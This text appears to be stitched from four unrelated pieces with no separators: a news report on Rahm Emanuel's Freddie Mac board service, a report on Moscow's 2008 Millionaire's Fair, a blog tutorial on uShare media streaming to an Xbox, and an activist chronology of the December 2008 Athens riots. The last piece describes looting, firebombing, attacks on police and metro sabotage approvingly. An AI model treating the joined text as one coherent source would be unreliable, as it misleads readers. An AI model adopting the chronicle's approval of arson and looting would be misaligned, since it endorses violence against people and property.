According to a complaint later filed by the Securities and Exchange Commission , Freddie Mac , known formally as the Federal Home Loan Mortgage Corporation , misreported profits by billions of dollars in order to deceive investors between the years 2000 and 2002 .
Emanuel was not named in the SEC complaint ( click here to read ) but the entire board was later accused by the Office of Federal Housing Enterprise Oversight ( OFHEO ) ( click here to read ) of having " failed in its duty to follow up on matters brought to its attention . "
In a statement to ABCNews.com , a spokesperson said Emanuel served on the board for " 13 months - a relatively short period of time . "
The spokesperson said that while on the board , Emanuel " believed that Freddie Mac needed to address concerns raised by Congressional critics . "
Freddie Mac agreed to pay a $ 50 million penalty in 2007 to settle the SEC complaint and four top executives of the Federal Home Loan Mortgage Corporation were charged with negligent conduct and , like the company , agreed to settle the case without admitting or denying the allegations .
The actions by Freddie Mac are cited by some economists as the beginning of the country 's economic meltdown .
The federal government this year was forced to take over Freddie Mac and a sister federal mortgage agency , Fannie Mae , pledging at least $ 200 billion in public funds .
Freddie Mac records have been subpoenaed by the Justice Department as part of its investigation of the suspect accounting procedures .
Emanuel was named to the Freddie Mac board by President Bill Clinton in 2000 and resigned his position when he ran for Congress in May , 2001 .
Freddie Mac Misrepresented Income , Says SEC
During the years 2000 , 2001 and 2002 , according to the SEC , Freddie Mac substantially misrepresented its income to " present investors with the image of a company that would continue to generate predictable and growing earnings . "
The role of the 18 - member board of directors , including Emanuel , was not addressed in the SEC 's public action but was heavily criticized by the oversight group ( OFHEO ) in 2003 .
The oversight report said the board had been apprised of the suspect accounting tactics but " failed to make reasonable inquiries of management . "
The report also said board members appointed by the President , such as Emanuel , serve terms that are far too short " for them to play a meaningful role on the Board . "
As a Congressman , Emanuel recused himself from any votes dealing with Freddie Mac until just this year .
In dealing with the nation 's economic crisis , the new White House chief of staff will almost certainly be involved in discussions about the house and mortgage markets .
Emanuel 's spokesperson said , " As White House chief of staff he will work with President - elect Obama and his economic advisers to help ensure we protect taxpayers and homeowners . "

There were cars and yachts , a naked model painted in gold and a who's who of the tacky Russian pop scene at the Millionaire 's Fair in Moscow on the weekend .
The only things missing were money and champagne .
The annual event had become an opulent symbol of Russia 's conspicuous consumption , where the newly rich could spend their petrodollars as quickly as they made them , with diamond - encrusted hubcaps and £ 160,000 cars in high demand .
Not so this year , as Russia dives into its worst financial situation in a decade .

Both the state and its wealthiest men are suffering from the effects of a crisis that they hoped would somehow remain outside the country 's borders .
" This year , people are just coming by to say hello , out of politeness , " said Gaukhara Zhakish , who is the chief representative for Gulfstream jets in Russia .
Over the past few years , the company has sold an average of 20 jets , ranging from $ 150 m to $ 250 m , in Russia .
This year , it has n't filled a single order since summer .
" Last year , we had a big booth .
This year , we decided it would n't be appropriate .
It 's not right to make people propositions in such a situation , " Ms Zhakish said at the fair 's opening night gala .
The numbers are bleak .
Russian exchanges have nosedived 70 per cent from mid-May highs .
Over $ 83 bn ( £ 54bn ) is estimated to have fled the country since August .
The World Bank has slashed growth forecasts for next year to just 3 per cent .
And Russia 's oligarchs , the most high - profile symbol of the country 's massive wealth , have lost more than $ 230bn since the credit crunch came knocking on Russia 's door in September , according to Bloomberg .
But try telling that to the hosts of the Millionaire 's Fair opening party , and many of the hopeful vendors who attended it .
" Everyone else has a crisis , but we have a millionaire 's fair , " proclaimed Ksenia Sobchak , a socialite and would - be actress – The Russian version of Paris Hilton .

But her co-presenter , the TV show host Andrei Malakhov , was n't quite on message .
" Life will go on , " he told the crowd , their eyes searching the room for increasingly rare bottles of tepid Laurent - Perrier champagne .
Russia 's leadership has worked hard to keep the country in the dark .
As the credit crunch reached Russia , hard on the heels of bank collapses in the West , state - run television stations were banned from using the word " crisis " .
That policy was reversed earlier this month , when the government began to push a package of " anti-crisis measures " , including a boost in social services aimed at keeping the population calm .
Now , state - run TV can use the word , as long as it is termed " global crisis " .
The President , Dmitry Medvedev , and the Prime Minister , Vladimir Putin , lay the blame for the crisis squarely at the feet of the United States .
Yet there is evidence that the August war in Georgia , as well as concerns over the investment climate amid messy shareholder disputes , have contributed to Russia being the worst performing of emerging market countries as the crisis unfolds .
The ruling duo's popularity , however , depends heavily on the oil - driven wealth that has boosted living standards for many Russians over the past five years .
As the oil price dives below $ 50 a barrel , the state has been forced to slowly depreciate the rouble , spending billions of dollars in carefully culled foreign reserves each week to prevent a sharp devaluation that could result in political death .
The country 's most respected business daily , Vedomosti , received a warning from the Prosecutor - General 's office this month for its coverage of the crisis , after an article suggested a scenario in which public officials would be pushed from office because of popular discontent .
Now it is rumoured that TV stations , as well as some banks , have been encouraged to refrain from using the word " devaluation " .
So far , the state 's public relations strategy seems to be working – at least among certain Russians .
" There is no crisis .
What crisis ? " said Igor Kirin , 46 , who has moved back to Moscow after spending several years living in New York , where he ran a gallery .
Strolling around the Millionaire 's Fair , Kirin refused to disclose what he did now .
" I have certain projects , and am looking for financing .
What they are I can't say , it 's a secret , " he said .
" If oil falls below $ 50 a barrel , then the crisis will last six months .
If oil costs more , then there will be no crisis , " he said confidently .
" We have a stabilisation fund , and there 's enough money in there to get us through this .
It 's not I who am saying this , but our President – Medvedev said so . "
Yet on the streets of central Moscow , far from the Millionaire 's Fair exhibition hall on the city 's wealthy outskirts , some rumbles of discontent are growing louder .
As the rouble weakens , Russians have flooded exchange points to change their money into dollars .
Some speak of the difficulty in finding the imported goods to which they have become accustomed .
The rouble has already slid about 15 per cent and many Russians expect it to dip further , to as low as 35 roubles to the dollar , from 25 roubles just a few months ago .
A protest , dubbed " The Pensioner 's Fair " , is due to be held today in central Moscow , organised by an MP belonging to the Kremlin - friendly A Just Russia Party .
" During a time of crisis and mass layoffs , the exhibition of luxury goods looks like a feast amidst a plague , " MP Nikolai Levichev said , announcing the move .
Analysts estimate that Russia is about six to nine months behind the West in feeling the effects of the global financial crisis .
Russia 's richest have faced limited access to funds and margin calls that have depleted their wealth , and Russian banks have slashed jobs as credit dries up .
The real economy is only beginning to feel the pinch , with many firms now starting to cut salaries and lay off workers , pushing the unemployment rate up to 6.1 per cent in October .
The construction and real estate sectors have been among the worst hit so far .
Last week , developers halted construction of Russia Tower , a 600 m ( 2000 ft ) skyscraper designed by Norman Foster that was to have been the tallest building in Europe .
The tower , in a development called Moskva Citi , Moscow 's answer to Canary Wharf , was the ultimate symbol of Russia 's desire to be at the forefront of international finance .
This year 's Millionaire 's Fair showcased fewer development projects than in the past .
One man attempting to make a sale was Dmitry Borisov , a representative of a newly built elite neighbourhood called Baden - Baden , in Moscow 's forested outskirts .
" The people are n't affected , " Mr Borisov said .
" Maybe they 're a bit more careful but they still spend . "
Minutes later , he could be heard pleading with a prospective buyer looking to stroll away : " The time to make the decision is now ! "
The homes in Baden - Baden cost between 44 million and 105 million roubles ( £1 m to £ 2.5 m ) but Mr Borisov 's assistant later concedes that they 're considering offering discounts of between 10 and 15 per cent .
The firm began selling homes in the summer , and have only managed to fill five of the 39 houses
" In crisis times , this is a good amount , " the saleswoman , Anastasia Vasilieva , says .
" In real estate , in general , it 's small . "
Nearby , Svetlana Chiryatnikova is begging two men to stick around and wait for some whisky cocktails she promises will soon arrive .
Ms Chiryatnikova represents Status , a magazine that costs $ 100 per issue and promises readers an exclusive luxurious lifestyle .
Though she has n't managed to entertain an interested party all evening , Chiryatnikova is all energy and smiles .
" Look around – what crisis ?
Everyone 's expecting it to come , but no one knows what it will be . "
Most Russians think in terms of the financial crisis of August 1998 , when the government defaulted on its debt and sharply devalued the rouble , wiping out the savings of many average Russians .
This time around it is different , and while " the krizis " is the main topic of conversations in bars , offices and taxi cabs , no one knows exactly what is coming .
The summer techno hit " Moscow Never Sleeps " pumped through the exhibition hall about 1 am , as the Millionaire 's Fair opening began winding to a close .
Men in suits and women in fine ball gowns scoured the grounds , ashing cigarettes on the carpets as they hunted for champagne .
Ms Zhakish , the Gulfstream vendor , conceded that it felt like the party was over .
" The best fair was in 2006 , it was the pinnacle .
People spent money for pleasure , just to spoil themselves . "
" A plane or an expensive car became a kind of small toy . "
At this year 's Millionaire 's Fair , the toys were just as shiny and opulent , but the mood was considerably less glamourous as Russia settles in for what promises to be a very long winter , filled with the uncertainty to which Russians have become alltoo accustomed .
Like most people I have a couple TVs in my house .
One of the TVs has the Linux based MythBox on it and the other has the Xbox 360 .
Now I keep all my movies on the MythBox ( all legal backups of course ) .
I wanted to play these on my Xbox on the other TV .
I noticed that after the Xbox 360 dashboard update the Xbox saw my shared drive and I could browse to my media directories .
When I tried to Play one of these I got some cryptic Microsoft error code .
So I did a little research and found out that Xbox media streaming uses the DLNA protocol to receive content from a peer on a network .
Great , does Linux have a DLNA protocol server , YES , it is called uShare .
Here are the easy steps to set it up .
sudo apt - get update
sudo apt - get install ushare
Configuration
Once finished , you ’ll have uShare installed and ready for configuration .
Out of the box , it wo n’t work for our purpose .
You ’ll need to edit /etc/ushare.conf to enable Xbox compatibility as well as define the standard port – 49200 .
Open /etc/ushare.conf as root and change the following lines :
USHARE_PORT=49200
USHARE_DIR=/ path/to/your/media
ENABLE_XBOX=YES
Before these changes will take effect , you ’ll need to restart ushare using its init script .
However , an issue I ’ve noticed is that the last line ( ’ ENABLE_XBOX=YES ’ ) does not always work .
So before we restart uShare , we ’ll need to make a small change to the init script that resides under / etc / init.d/ to force Xbox compatibility :
sudo vi /etc/ init.d/ushare
and add the following line at the beginning of the script :
USHARE_OPTIONS=-x
This tells uShare to start with Xbox compatibility .
Now restart uShare using the init script :
invoke - rc.d ushare restart
Now you are finished .
You may need to restart the Xbox .
Now navigate to ‘ My Xbox ’ and then select ‘ Videos ’ and finally you should see ‘ u Share ’ at the bottom ( computer icon ) .
Selecting that will connect to your Linux box and you ’ll be able to browse your media just as you would on your PC .
When I tried to play a xvid file it said I needed a download to play this file .
I am sure it was the codec , but it was free and worked great .
Now I have another TV with a HD feed that can Play all the movies on my MythBox .
u Share also works for playing media across the network on the PlayStation 3 .
I love technology !
A detailed updated summary of the recent events in Athens , from the perspective of some proletarian participants .
( Updated 2 Jan 2009 )
A shooting by police on Saturday 6th of December has triggered off in cities all over Greece the fiercest riots in decades .
What follows is a first –and incomplete– presentation of the recent riots in Athens based on our own experiences and on what we have heard of .
On the one hand , the fierceness of the riots and the determination of the rioters and looters and on the other hand , the unfolding strategy of the state certainly need more time and closer attention to be adequately estimated , something that we are honestly not in the position to do at the moment , because we still participate in several local activities , demos and assemblies .
Saturday , 6th of December
At about 9.10 pm , a police special guard shot dead a 15 - year - old boy , Alexis - Andreas Grigoropoulos , in cold blood , in a quite usual bickering near Exarhia Square .
Immediately after that , lots of people –mainly anti-authoritarians – gathered in the area to find out what ’s going on and to express their rage against police brutality .
Hundreds of policemen attempted to seal the area in order to suppress any reactions , but with no result .
Spontaneously , people started to attack the police in the streets around the square with every means possible .
In less than two hours , more than 10,000 people had taken to the nearby streets to communicate the event and clash with the police .
Some anarchist groups occupied the historical building of the National Technical University , which lies a few blocks away , and the Faculty of Economics , which is situated 1 km away to use them as centres of struggle .
The same was done by leftists at the Faculty of Law , less than 1 km from the point where the murder took place .
At this district , clashes with the police and attacks against banks and stores lasted until 4 am , as far as we have witnessed .
The news concerning the murder spread rapidly to many people through mobile phones and the internet .
As a result , about 150 people , who already were at Monastiraki Square , spontaneously attacked and looted almost all the stores at Ermou Street , the world ’s 11th most posh street .
There , lots of passers by joined in from nearby pubs and clubs .
In the centre of Athens that night , some people attacked the police station near Acropolis causing severe damage .
It has to be noted that the news concerning the murder of the young boy immediately spread to several cities ( Thessaloniki , Ioannina , Irakleio , Volos ) where attacks against banks , police stations and stores also took place .
Sunday , 7th of December
The Faculty of Law squat called for a demonstration at 2 pm outside the Archaeological Museum which is right next to the also squatted historical building of the National Technical University in Patission Avenue .
Many people gathered and at about 3.30 pm the demo towards the Athens Police Headquarters begins .
We already knew that the police would never let us approach their Headquarters , but we were determined to arrive as close as we could .
Bank - smashing and stone - throwing against the cops started immediately after we had left the square .
As we turned right to Alexandras Avenue standing at the end of the demo , we realized that the participants amounted to approximately 4.000 people , of all ages .
There were attacks against every store in sight , mainly luxury car shows and banks .
At the beginning , police stood at a safe distance from the rioters and did n’t let themselves become a target .
Then , as they came closer , the rioters attacked them mainly with stones .
The police made a first attempt to break the demo with teargas near Argentina Square , but with no result .
After ten minutes , at the corner with Ippokratous street , they made a second fiercer attempt with lots of teargas which finally proved successful : the demo broke into several parts and its main parts headed to the right towards Neapoli .
Attacks against stores and banks kept going on , also accompanied by car - smashing .
Lots of people chose to keep on marching towards Police Headquarters by a parallel street , but after some time it became clear that there was no way through : a small street perpendicular to Alexandras Avenue is the spot that the already famous photo with the gun-holding riot policeman was taken .
Tension was high .
We decided to move back and return to Exarhia Square to see what was to be done next .
At the way back , clashes with the police were still taking place but to a lesser extent .
Some people attacked the 5th police station which is located nearby and the police responded with plastic bullets .
Later in the evening , there began clashes with the police again –and to a lesser extent attacks against stores– around the National Technical University and the Faculty of Economics , which would last until late at night .
Monday , 8th of December
In the morning , youths from several high schools gathered spontaneously in front of the Police Headquarters to protest .
Many youths from the northern , east and western suburbs moved to the city centre making a spontaneous demo .
Youths from the schools of Pireaus ( a port at the south - west part of the city ) attacked the central police station overturning police cars .
At 6 pm , the Faculty of Law squat called for a demonstration at Propylaia , a central Square of Athens .
Our estimation is that more than 20.000 people , mainly young people , participated in that demo .
Lots of them , maybe more than 1.500 , were walking " in and out " of the demo smashing banks and destroying the luxurious shops of the city centre .
They started to destroy or loot the commodities almost from the first moment of the demo .
The youths destroyed banks at Omonoia square and attacked more than half of the shops of Stadiou Avenue and Filellinon Avenue .
Also , severe looting took place at the shops in the first blocks of Piraeus Avenue .
People were walking slowly and nobody really tried to stop neither the attacks nor the looting .
Some even stood by and cheered the attacking youths .
At the same time , youths were also attacking the cops , the banks and the shops in various parts of the city all the way down to Syggrou Avenue , a street leading to the south of Athens .
Up until now , the real extent of the damage caused to private property that night has not been estimated .
The media says it amounts to 10 billion euros , which could be true since dozens of stores were attacked , looted or burnt down mainly by greek and immigrant “ uncontrollable youths ” .
Although one could say that the greek youths ( students and precarious workers ) had the initiative and the immigrants followed by , we have to admit that it was very difficult to distinguish the one from the other in the streets .
As far as immigrants are concerned , Albanians of second generation participated mostly in the attacks against cops and buildings and immigrants of other origin –mostly Afghans and Africans - confined themselves to looting .
Riots and looting covered approximately half of the city centre .
Although the police made several arrests that evening , it would be untrue to say that they could even think of controlling the situation , because there were so many people in the streets , acting in small groups of ten or twenty people .
Tuesday , 9th of December
Teachers of primary and secondary education went on strike that day against police brutality .
At noon , the demonstration began from Propylaia Square and headed towards the Parliament , but there were no more than 3.000 participants .
After the end of the demo , and despite the fact that they were small in number , 150 youths hurled firebombs , rocks and other objects at riot police .
The so - called Communist Party ( KKE ) , scared by the prospect of a generalized riot , showed once more its counter - revolutionary , reactionary nature .
They declared the rioters and looters as secret agents of ‘ foreign dark forces ’ and called the ‘ people ’s movement ’ , an imaginary subject of which they are supposedly the rightful representatives , to stay away from the fight .
History repeats itself : this party for the last 35 years has been chanting the same , monotonous and dangerous mantra about ‘ provocateurs ’ ; in 1973 they had done the same against the students and workers who had occupied the National Technical University ; a riot that had led to the overthrow of the dictatorship .
Once again , they are trying to save the state and restore public order .
At 3 pm the funeral of the dead boy took place in the cemetery of Palaio Faliro , a suburb in the south of Athens .
More than 5.000 gathered there to bid Alex the last goodbye and to shout once more against police murders .
During the funeral , about 200 young people were involved in attacks against the riot police , who stood a few blocks nearby .
This confrontation lasted for more than an hour , in the course of which some stores and banks were attacked ; stones were also thrown against a police car .
After an hour , young people headed towards the Palaio Faliro police station , but the police stopped them a few blocks away .
During this riot , three police motor bikers shot more than ten times in the air to “ scare ” the rioters .
During the night , fascists appeared in the streets around the National Technical University and the Faculty of Economics where fierce clashes with the police were taking place .
At Victoria Square , immigrants attacked the police and tried to loot 3 stores , but undercover police and “ civilians ” brutally arrested one of them .
Generally speaking , this was the day that the state unofficially pushed forward the so called “ social automation ” and encouraged the collaboration between shop owners , fascists , “ civilians ” and the police against the rioters .
Wednesday , 10th of December
This day was a day of general strike , and its aim had been predetermined over a month ago : it was mainly “ against the state budget 2009 ” .
Due to the ongoing riots , the chief unionists spoke against police brutality , separating at the same time the “ rioters ” from the “ responsible quiet demonstrators ” .
More than 7.000 people attended the gathering at Syntagma Square .
Some protesters threw fire bombs at police during a general strike which paralyzed Greece and piled pressure on a doddering government .
Small scale riots took place at Panepistimiou Avenue .
After the demo , many people attended the assembies at the National Technical University and the Faculty of Law to talk about what is going to be done in the next days .
Later on , there was a big assembly of the anti-authoritarian milieu at the Faculty of Economics .
Earlier in the morning , high school students attacked the local police station in the suburb of Kaisariani .
At night , clashes with the police took place at Tritis Septemvriou Avenue , in the center of Athens .
The riots have spread to some 42 prefectures of Greece , even in towns where not even demos had taken place before .
The pattern is the same : mainly students and young people attack police stations , banks , stores and state buildings .
They gather spontaneously , after communicating with each other over mobile phones .
Anarchists and politicos are just a small part of the rioters and in many cases they are taken aback by the fierceness , the spreading and the duration of the riots .
It is mostly in Athens and Irakleio ( Crete ) that a big part of the rioters are immigrants and so this riot can be rightfully called a multinational one , the first of this kind in Greece .
Against this totally new situation , the media have tried to change their propaganda and talk of ‘ greek protesters ’ and ‘ foreign looters ’ , in an effort to flare up racism .
Up until now , about half of the arrested people in Athens are immigrants and the main charge against them is looting .
The vast majority of the arrested throughout the country is young people .
Thursday , 11th of December
On Thursday , high school students abandoned their schools and gathered outside police stations all over Athens .
Some of them were attacked with rubbish bags and stones and the police threw tear gas and in some cases … stones back .
All in all 35 police stations were blockaded in Athens and at some places other people participated as well , mostly parents .
The entrance of the prison in Korydallos was also attacked by students .
The media said that 4500 tear gas canisters have been used by the police these 5 days .
They are running out of tear gas and think of importing some from Israel !
In the morning a group of libertarians occupied the Town Hall in Agios Demetrios , a suburb in the south of Athens .
A lot of people from the neighborhood participated in the evening assembly and the municipal workers who supported the occupation issued a communique which can be found in the appendix of this chronology .
The Town Hall has been used since then as a gathering place and a counter - information centre .
In several universities assemblies took place and university occupations spread .
Militants from the student organization of the Communist Party ( PKS ) tried to block assemblies in order to prevent the occupations ( Panteion University , School of Philosophy in the University of Athens ) .
Their attempts were unsuccessful as occupations expanded throughout Athens and Greece .
Early in the evening there was a big demo ( maybe 5000 ) in the centre of Athens called by an assembly of mainly leftist trade unionists and organizations who gather at the occupied Faculty of Law .
At the end of the demo there started clashes with the police in the centre of the city and around the occupied Faculty of Law which lasted for some hours .
In Komotini , a town in the eastern - north , near Turkey , a demo of mostly university students was attacked and chased into the university by many fascists and far right thugs who infest the area to protect … national security .
There is a general feeling of hostility towards cops and fedding up with everything .
Police brutality in an increasingly police state after the 2004 Olympics , lousy wages and working conditions , high school student overwork and pressure , university students ’ discontent with a life that is increasingly characterized by insecurity and fear , government and church high officials ’ corruption , immigrants ’ overexploitation and a society torn apart by deepening class divisions : a explosive mixture where the murder of the kid was just the fuse .
The publication of extracts from the testimony of the cop who murdered the kid caused general outrage .
He ‘ accused ’ the student of having ‘ deviant behaviour ’ because ‘he was expelled from the private school he was attending ’ ( which is a lie , to say the least ) .
His lawyer , a notorious TV celebrity , made an even more provocative statement :
‘ It is now only up to the Greek justice to decide whether the young boy was justly killed , or not ’ .
The ballistic examination report was expected today .
“ Leaks ” in the media the previous days have been suggesting that the report will claim Alexandros was killed by a ricochet and not a direct shot ( which is against what every single eye witness says ) .
However , such provocations are at least answered in the streets .
Among other things , new imaginative slogans are invented every day : ‘ We did not throw stones ; they were ricocheted ’ , ‘ The right thing is for the lawyer to be killed by ricochet ’ .
Friday , 12th of December
Seven hundred high schools and one hundred universities are occupied and their number is expected to jump up .
A big student demo was called in Athens ( 10,000 or more ) .
Students and other demonstrators attacked the police and some banks were smashed .
During the demo two hundred anarchists trashed the lawyer ’s office .
The riot cops arrested several students ( some of them are 13 - 14 years old ) .
Saturday , 13th of December
A sit-in was organized in Syntagma Square at noon by the coordinating committee of student university occupations as well as by political groups .
More than 1,000 people of all ages participated : university students , high school students as well as workers .
The sit - in went on until the end of the night .
After midnight the police attacked the peaceful protest with tear gas and dispersed the gathered crowd .
Protests and demos were also organized in suburbs around Athens : Nea Smirni , Peristeri , Zografou .
In the evening the Ministry of Environment and Public Works in Patission street was attacked by a crowd of two hundred people .
At 9 o’ clock about a thousand of people gathered in Exarhia to protest against the murder of Alexis - Andreas Grigoropoulos near the spot he was murdered .
Some people attacked the local police station whereas others clashed with the riot police .
There was a demo heading for Monastiraki and Gazi , neighborhoods where many people go clubbing on Saturday night .
The demo was attacked by the police and few people managed to continue .
The conflicts went on in Exarhia but the attacks of the police forced the people to disperse into various directions .
A large part of the crowd was pushed into the premises of National Technical University .
Riots continued in the streets around National Technical University during the night .
People who managed to follow the demo passed from Monastiraki , Thisseio , Gazi and then they tried to return to the centre marching on Piraeus street .
Some banks and surveillance cameras were attacked by the demonstrators .
The police attacked again the demo near Omonia square and there were more than 50 arrests .
The arrested people were let free without any charges .
During the day several banks were attacked throughout Athens .
Sunday , 14th of December
There were demos in several suburbs in Athens as well as in many cities and towns in Greece ( Thessaloniki , Corfu , Volos , Xanthi etc ) .
Earlier in the night , a peaceful demo at Syntagma square called by bloggers was dispersed by the riot police with tear - gas .
In the central square of Nea Smirni , a south - eastern suburb of Athens , a deserted big cafÈ called “ Galaxias ” owned by the municipality was occupied at noon by about a hundred people ( antiauthoritarians , members of a municipal party and several residents ) in order to be used as a counter - information and action coordination center .
The occupation of public buildings is a new form of struggle coming out of the riots .
As we saw , it initially appeared in the suburb of Agios Demetrios , with the occupation of the town hall .
The occupation of “ Galaxias ” adopted the name “ Eleftheros Galaxias ” ( which means “ Free Galaxy ” ) and calls for an open neighborhood assembly later in the afternoon .
During the day four radio stations were occupied .
The radio stations were used for broadcasting statements and communiquÈs that called for the generalization of the insurrection .
In the afternoon , the Residents ’ Committee in Exarhia called for a rally at the spot where the murder of Alexis took place .
In spite of the rain , a significant number of people participated and discussed about the events in an open air assembly .
When the riot police appeared , the people kicked them away by shouting and insulting them .
The mayor of Athens announced that the new Christmas tree in Syntagma square will be erected on Wednesday since the previous one was flared up by Molotov cocktails in the night of 8th of December .
For the state , this tree symbolizes the consumerist spirit and the return to normality while for the insurgents its burning down means that the riot is still going on .
Several attempts to set it on fire again have been taking place during demos so far .
Monday , 15th of December
At 5 a.m. , the occupation of the old town hall of Halandri , a north - eastern suburb of Athens , was attacked by a handful of villains who allegedly had mafia connections with local shop owners .
One of them forced the protesters to leave the building threatening them with a shotgun and a baseball bat .
Nevertheless , the people managed to reoccupy the building after two hours .
In Agios Demetrios the popular assembly of the occupation tried to cooperate with the municipal clerical workers in order to restart some municipal services without the mediation of the municipal authorities .
The plan was to satisfy only urgent social needs , such as issuing green cards for the immigrants as well as paying wages and extra allowances .
The mayor and the municipal council intimidated the workers trying to prevent them from providing these services .
In the morning about a hundred high school students and a few workers and militants gathered outside the courts in Evelpidon street to express their solidarity towards those arrested during the clashes with the riot police the previous week .
The youths entered the courts marching , bypassing the controls .
At the same time a demo was organized in the suburb of Korydallos by more than a thousand youths from nearby schools .
The youths headed for Korydallos prison ( the biggest prison of the country ) and attacked the police with rocks and firebombs .
Elsewhere , in Pagrati district , high schools students demonstrated outside the police station .
At noon , more than a thousand youths from local schools gathered outside the Police Headquarters in Alexandras Avenue and attacked the police with eggs , flour and rocks .
Two students got arrested after being badly hit .
In the afternoon about 150 demonstrators participated in a musical demo at Propylaia square .
The demonstrators blocked Panepistimiou Avenue while singing and dancing but faced a fierce attack by the special police forces .
At the same time about 100 people made an intervention in the underground metro station of Propylaia .
Leaflets were distributed expressing a critique of the capitalist circulation of the labour power commodity , calling for free transport for all and promoting the violation of zero tolerance policies inside metro stations .
The intervention ended with a sabotage of all the vending machines , the writing of slogans on the walls of this sterilized environment and the spray - painting of surveillance cameras .
Special police forces entered into the metro station and the merry participants attacked them verbally and made fun of them from the top of the stairs at the entrance of the station .
At the same time , the same action took place in the metro station of Dafni organised by the popular assembly of the occupied Town Hall of Agios Demetrios .
A huge banner was hung on the university building at Propylaia square depicting Kugias , the killer cop ’s lawyer , with the slogan ‘ Go ricochet yourself , you creep ’ .
Shortly after the intervention at the metro station , a demo called by the assembly of the occupation of the Faculty of Law started from this square .
About 2,000 people participated in it heading for the Parliament and then they returned to Propylaia square .
In the suburb of Nea Filadelfia the municipal cultural centre was occupied in order to be used as a gathering place and a counter - information centre .
Occupations of municipal buildings and radio stations as well as university departments continued to spread throughout Athens and other cities .
On this day , 14 immigrant communities representatives issued a statement trying to keep their distances from the riots and the lootings in particular :
‘ We are not looters , immigrants have public voice and dignity …
We declare that the vast majority of immigrants are neither looters nor criminals ’ .
Adopting a quite different stance , people from Athens ’ Haunt of Albanian Migrants distributed a leaflet at the student picket outside the police headquarters in the morning , declaring their class share in the riots , ‘ These days are ours , too ’ .
The whole text can be found in the appendix .
Tuesday , 16th of December
A group of 50 people managed to enter the studios of NET , the national , state - run television channel and interrupted the news bulletin of 3 pm for about 1 minute .
The cameras were turned to the protesters who carried banners calling for “ Immediate release of all the prisoners of the insurrection ” , “ Freedom for all ” as well as urging spectators to “ Stop watching TV and go out in the streets ” .
The group that organized this action issued a communiquÈ which can be found in the appendix of this chronology .
At noon , a group of about 70 militants attacked the central police station of Ilissia which also serves as the headquarters of a unit of the special police forces ( YMET ) .
A police van and four police vehicles were burnt and 2 policemen were injured .
In the afternoon , gatherings and demos were organized in the suburbs of Petralona , Dafni , Agios Demetrios with the participation of high school students , workers and other residents .
Also , about a thousand people gathered in Exarhia and marched towards the local police station where they were stopped by strong police forces .
The occupation of the Town Hall of Agios Demetrios ended with a demo of about 300 people .
At another place of the city centre , an intervention was organized at the metro station of Victoria square in the afternoon .
Vending machines were destroyed , slogans were written on the walls ( “ Let ’s bring the insurrection underground ” was one of them ) and surveillance cameras were spray painted .
Wednesday , 17th of December
The central offices of the General Confederation of Labour of Greece ( GSEE ) which resides in the junction of Patission and Alexandras Avenues were occupied early in the morning by a group of about 70 workers .
The aims of the occupation were described in the first communiquÈ of the occupation which can be found in the appendix .
About 50 bureaucrats with their thugs tried to evict the squatters at around 3 pm but they were pushed back by the people with the help of squatters from the ASOEE occupation which is located nearby .
An assembly was called at 6 in the evening and was attended by 800 people .
From the beginning it was obvious that there were two tendencies inside the occupation –no matter how clearly articulated : a workerist one , that wanted to use the occupation symbolically in order to criticize the trade unionist bureaucracy and promote the idea of an independent of political influences base unionism ; and a proletarian one , that wanted to attack one more institution of capitalist society , criticize syndicalism and use the place for the construction of one more community of struggle in the context of the general unrest .
The leftist trade unionists that were present in the assembly did not really know what to do with all these insurgent workers and left .
In the morning , university students hung two giant banners on the Acropolis rock with slogans calling for mass demonstrations on 18/12 across Europe and resistance .
The workers in the archaeological site supported the action .
In the previous days , the workers on the Acropolis were on strike because of a reduction of their wage due to a cut down of a special allowance .
Later in the day the ministry promised to satisfy the demands of the strikers and the mobilization was suspended .
In the evening the occupation of the old Town Hall in Halandri organized a demonstration that headed for the police station .
At least 400 people participated and attacked the police station with eggs , rocks , bottles etc ; 30 minutes earlier , the same demo had thrown eggs and paint at the local Court of Justice .
Another demo marched through the suburbs of Kesariani , Pangrati and Vironas .
300 people took part in it and headed for the police station where they engaged in short conflicts with the police .
Then , the demo marched towards the Town Hall of Kesariani which was occupied for a few hours .
Sabotage of ticket vending machines and surveillance cameras was repeated in the evening at 5 metro stations : Attiki , Ano Patisia , Kato Patisia , Tavros and Monastiraki .
Another high school student was shot by unknown people at a youth meeting place in Peristeri , a western suburb of Athens .
Fortunately , the student , whose father is a well known trade unionist and a member of the so - called Communist Party , was not injured seriously .
A bunch of professors ( mainly teaching Law in greek universities ) launched an Appeal to the Government and the Political Entities to take some measures against the ‘ ills ’ of the greek society stressing mostly the stricter use of the university asylum and the prosecution of the use of masks during demos .
In this way , the intellectuals , although belated , tried to introduce the old Black Act in Greece in 2008 updating its meaning against insurgents .
Thursday , 18th of December
A demonstration began at noon from Propylaia square with the participation of high school students , university students , teachers and other workers .
The base union of the couriers had called a one - day strike , whereas the union of the workers in bookstores and publishing houses had called a 5 - hour work stoppage .
The couriers formed their own block in the demo .
Also the confederation of the unions of the public sector workers ( ADEDY ) had called a 5 - hour work stoppage .
This gave the opportunity to many workers to participate independently in the demo .
The number of the demonstrators was very high .
Some estimate it was around 20.000 .
When the demo reached the parliament , clashes with the riot police began .
What the cops mainly did was to protect the newly erected Christmas tree at Syntagma square ; they gathered around it , trying to prevent it from getting burned by molotov cocktails hurled at it .
It was such a ludicrous spectacle to watch that hundreds of demonstrators stood there shouting and mocking them .
The true Christmas spirit : the Christmas tree , ( a plastic one , actually ) , the symbol of the happy consumerist protected by the forces of law and order .
The clashes spread to Panepistimiou Avenue , Akadimias Avenue and Solonos Street until evening .
Several people were arrested and among them a soldier who was passing by and was badly hit by the cops .
After a similar demo in the city of Patra the local Workers ’
Centre was occupied by some demonstrators following the example of the occupation of GSEE .
An antiracist demo with a few hundred people was organized in the afternoon by immigrant and antiracist organizations .
Some of those organizations were the ones that had denied the involvement of immigrants in riots and looting , thus demonstrating their role as capitalist mediators .
In the evening , members of the so - called Communist Youth organized a demo in Peristeri to protest against the attempt on the high school student ’s life in the previous day .
According to some reports , some high school students barracked the members of the Communist Youth .
A group of art students interrupted a classical music concert in Megaro Mousikis , the most important music hall in Greece , distributed leaflets criticizing the role of art and artists in relation with the recent events and chanted some slogans against the cops and the state .
Friday , 19th of December
The French Institute was attacked at noon by 40 people with firebombs and rocks .
Slogans were spray - painted on the walls : “ Spark in Athens , fire in Paris , insurrection is coming ” and “ Greece – France : Insurrection everywhere ” .
This action expressed solidarity with the activists who are accused of sabotaging the railways as well as with the high school mobilizations in France .
In the afternoon a solidarity concert was given in Propylaia square with the participation of hundreds of artists and more than 5,000 people .
